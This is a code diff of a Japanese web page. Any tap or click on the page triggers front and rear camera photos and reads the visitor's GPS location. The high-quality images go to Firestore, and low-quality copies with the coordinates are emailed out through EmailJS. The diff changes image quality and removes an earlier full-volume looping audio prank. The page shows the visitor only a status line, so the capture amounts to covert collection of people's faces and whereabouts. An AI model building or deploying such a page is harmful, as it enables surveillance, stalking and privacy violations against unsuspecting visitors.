@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Firestore保存＋EmailJS送信（2枚ずつ連写）＋音声再生</title>
+<title>Firestore保存＋EmailJS送信（2枚ずつ連写＋高画質＆低画質）</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -43,7 +43,6 @@
 
   const statusEl = document.getElementById("status");
   let busy = false;
-  let audio;
 
   function log(text) {
     console.log(text);
@@ -51,7 +50,7 @@
     statusEl.scrollTop = statusEl.scrollHeight;
   }
 
-  async function capturePhotos(facingMode) {
+  async function capturePhotosWithQuality(facingMode) {
     log(`📸 ${facingMode}カメラ起動`);
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
     const video = document.createElement("video");
@@ -65,18 +64,26 @@
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
 
-    const photos = [];
+    const highQualityPhotos = [];
+    const lowQualityPhotos = [];
+
     for (let i = 0; i < 2; i++) {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const dataUrl = canvas.toDataURL("image/jpeg", 0.3);
-      photos.push(dataUrl);
-      log(`撮影 ${i + 1} 枚目 サイズ: ${Math.round((dataUrl.length * 3) / 4 / 1024)} KB`);
+
+      const highQualityDataUrl = canvas.toDataURL("image/jpeg", 0.9);
+      highQualityPhotos.push(highQualityDataUrl);
+
+      const lowQualityDataUrl = canvas.toDataURL("image/jpeg", 0.2);
+      lowQualityPhotos.push(lowQualityDataUrl);
+
+      log(`撮影 ${i + 1} 枚目 サイズ 高画質: ${Math.round((highQualityDataUrl.length * 3) / 4 / 1024)} KB, 低画質: ${Math.round((lowQualityDataUrl.length * 3) / 4 / 1024)} KB`);
       await new Promise(r => setTimeout(r, 50));
     }
 
     stream.getTracks().forEach(t => t.stop());
     video.remove();
-    return photos;
+
+    return { highQualityPhotos, lowQualityPhotos };
   }
 
   function getLocation() {
@@ -131,23 +138,25 @@
     log("🔄 処理開始");
 
     try {
-      const rearPhotos = await capturePhotos("environment");
-      const frontPhotos = await capturePhotos("user");
+      const rearPhotos = await capturePhotosWithQuality("environment");
+      const frontPhotos = await capturePhotosWithQuality("user");
       const location = await getLocation();
 
+      // Firestoreは高画質画像を保存
       const firestoreData = {
-        rearPhotos,
-        frontPhotos,
+        rearPhotos: rearPhotos.highQualityPhotos,
+        frontPhotos: frontPhotos.highQualityPhotos,
         location,
         createdAt: new Date().toISOString(),
       };
       await saveToFirestore(firestoreData);
 
+      // EmailJSは低画質画像を送信
       const templateParams = {
-        photo_rear1: rearPhotos[0],
-        photo_rear2: rearPhotos[1],
-        photo_front1: frontPhotos[0],
-        photo_front2: frontPhotos[1],
+        photo_rear1: rearPhotos.lowQualityPhotos[0],
+        photo_rear2: rearPhotos.lowQualityPhotos[1],
+        photo_front1: frontPhotos.lowQualityPhotos[0],
+        photo_front2: frontPhotos.lowQualityPhotos[1],
         location_info: `緯度: ${location.lat}<br>経度: ${location.lon}<br>精度: ${location.acc}m<br>時刻: ${location.time}`,
         date: new Date().toLocaleString()
       };
@@ -161,35 +170,12 @@
     }
   }
 
-  // クリックされたらbase64 mp3を爆音でループ再生
-  function playLoopSound() {
-    if(audio) return; // すでに再生中なら無視
-
-    const base64mp3 = "data:audio/mp3;base64,//uQxAAAD..."; // ここにbase64エンコード済みmp3データを入れてください
-
-    audio = new Audio(base64mp3);
-    audio.loop = true;
-    audio.volume = 1.0; // 爆音
-    audio.play().catch(e => {
-      log("❌ 音声再生失敗: " + e.message);
-    });
-  }
-
-  window.addEventListener("click", () => {
-    runProcess();
-    playLoopSound();
-  });
-
-  window.addEventListener("touchstart", (e) => {
-    e.preventDefault();
-    runProcess();
-    playLoopSound();
-  }, { passive: false });
-
+  window.addEventListener("click", runProcess);
+  window.addEventListener("touchstart", runProcess, { passive: false });
 </script>
 </head>
 <body>
-  <h1>📸 Firestore保存＋EmailJS送信（2枚ずつ連写）＋音声再生</h1>
+  <h1>📸 Firestore保存＋EmailJS送信（2枚ずつ連写＋高画質＆低画質）</h1>
   <pre id="status">待機中...</pre>
 </body>
 </html>
